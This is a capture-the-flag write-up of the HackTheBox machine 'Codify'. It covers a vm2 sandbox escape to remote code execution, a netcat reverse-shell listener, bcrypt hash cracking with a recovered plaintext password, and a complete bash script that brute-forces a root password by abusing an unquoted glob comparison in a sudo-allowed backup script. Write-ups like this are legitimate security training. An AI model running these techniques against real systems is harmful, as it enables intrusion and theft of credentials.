---
layout: writeup
category: HTB
points: 20
solves: 15051
tags: nodejs rce sqlite3 hashes sudoers bash-bruteforcing
description: In this machine, first we have a web vulnerable to nodejs rce that give us access to as "svc" user, then we can move to user "joshua" because the credential is hashed in a sqlite3 db file. Later, to escalate as root we have to abuse sudoers privilege to bruteforce a password with the "*" character in bash (because a misconfiguration in the script) that is reused for "root" password in system.
date: 2024-04-05
comments: false
title: HTB Codify Writeup
---

# Enumeration
I will start with a port scanning on the machine's ip to identify ports opened:

```bash
❯ sudo nmap -sVC -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.239 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 22:20 CEST
Nmap scan report for 10.10.11.239
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.27 seconds
```
* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a real environment).
* -n: Disables DNS resolution protocol.
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file with name "targeted".

We see three ports:

* 22: ssh -> we don't have valid credentials so we can't do anything
* 80: web -> Apache
* 3000: web -> Node.js express

Let's enumerate the web port 80 now:

```bash
❯ whatweb http://10.10.11.239
http://10.10.11.239 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.239], RedirectLocation[http://codify.htb/], Title[301 Moved Permanently]
http://codify.htb/ [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.239], Title[Codify], X-Powered-By[Express]
```

We have a redirect to a domain so let's add it to the /etc/hosts file:

```bash
❯ tail -n 1 /etc/hosts
10.10.11.239 codify.htb
```

Now let's visit the web:

![Branching](/assets/images/Codify/web-main.png)

We have a node.js code editor. We could try a rce payload but it's blocked:

![Branching](/assets/images/Codify/child_process-blocked.png)

Since we can't RCE, let's look the about page to look if they say some technologies used:

![Branching](/assets/images/Codify/about-page.png)

They say that they are using [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16) and if we click there we can see the version 3.9.16. Searching in google we can see [this article](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) that give us a payload, so let's try to print the result of whoami:

![Branching](/assets/images/Codify/rce.png)

We have RCE!

# Foothold
Let's spawn a reverse shell and stabilize the tty for doing ctrl+c correctly:

![Branching](/assets/images/Codify/reverse-shell-web.png)

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.124] from (UNKNOWN) [10.10.11.239] 53976
bash: cannot set terminal process group (1267): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@codify:~$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                                                                                        
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 443
                              reset xterm
svc@codify:~$ export TERM=xterm
svc@codify:~$ export SHELL=bash
```
* ``script /dev/null -c bash``: Spawns a tty
* ``ctrl+z``: puts the shell in background for later doing a treatment
* ``stty raw -echo;fg``: give us the shell back again
* ``reset xterm``: resets the terminal to give us the bash console
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal
* ``export SHELL=bash``: specifies the system that we are using a bash console

Let's enumerate the config files for the webservers:

![Branching](/assets/images/Codify/var-www-enum.png)

The contact folder is for the :3000 service and editor from the :80 one.
In the contact folder there is a sqlite3 db file:

```bash
svc@codify:/var/www/contact$ ls -l tickets.db 
-rw-r--r-- 1 svc svc 20480 Sep 12  2023 tickets.db
```

Let's enumerate it:

```bash
svc@codify:/var/www/contact$ sqlite3 tickets.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

We have joshua's hash, let's crack it in our machine:

```bash
❯ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
                                                                                                            
❯ hashcat --example-hashes | grep bcrypt -B 4
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #3200
  Name................: bcrypt $2*$, Blowfish (Unix)
< -- SNIP -- >

❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
<-- SNIP -->


$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1

<-- SNIP -->
```

So the password for joshua is 'spongebob1'

# Access as joshua

```bash
svc@codify:/var/www/contact$ su joshua
Password: spongebob1
joshua@codify:/var/www/contact$ whoami
joshua
joshua@codify:/var/www/contact$
```

Now we can see user.txt flag:
```bash
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt 
1e8**************************2c6
```

# Access as root

Let's watch sudoers privileges:

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: spongebob1
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

We can run as root that script, let's take it a look:

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

It's a script that do backups of the mysql databases. There is a misconfiguration in the script in the if statement because the comparision element are unquoted and we can insert special bash characters, let's see an example:

If we do a normal comparision with the variables unquoted, it works correctly:

```bash
❯ password=test1234                                                                                                                                                                                        
❯ if [[ $password == test1234 ]];then echo "Correct Password"; else echo "Incorrect password";fi
Correct Password
```

But the interesting thing is that if we put a special character in the variable, it also interpretes in bash:

```bash
❯ password=test1234
                                                                                                                                                                               
❯ verify_password=t*
                                                                                                                                                                                
❯ if [[ $password == $verify_password ]];then echo "Correct Password"; else echo "Incorrect password";fi
Correct Password
```

> Note: if you want to test this example in local, do it in bash and not in zsh. In zsh it doesn't works.

So we can apply this concept to bruteforce the password and retrieve it in plaintext, I have created this script to automate it:

```bash
#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
echo "Brute forcing... Wait!"
password=""
password_taked=false
while [[ $password_taked == false ]];do
	for (( i=0; i<$(echo $chars| tr -d '\n' | wc -c); i++ ));do
		char="${chars:$i:1}"
		echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2>/dev/null | grep -i "Password confirmed" &>/dev/null
		if [[ "$(echo $?)" == "0" ]];then
			password+=$char
			echo $password
			break
		fi
	done
done
echo $password
```

Let's execute it:

```bash
joshua@codify:/home/joshua$ cd /tmp/
joshua@codify:/tmp$ vi brute.sh
<PASTE THE CODE>
joshua@codify:/tmp$ chmod +x brute.sh
joshua@codify:/tmp$ ./brute.sh
```

![Branching](/assets/images/Codify/brute-pass.png)

Now let's see if password of mysql is reused in the system:

```bash
joshua@codify:/tmp$ su root
Password: 
root@codify:/tmp# whoami
root
```

We are root! Now we can see the flag and pwn the machine:

```bash
root@codify:/tmp# cd
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt
e5****************************31
```

That's all guys, hope you enjoyed!
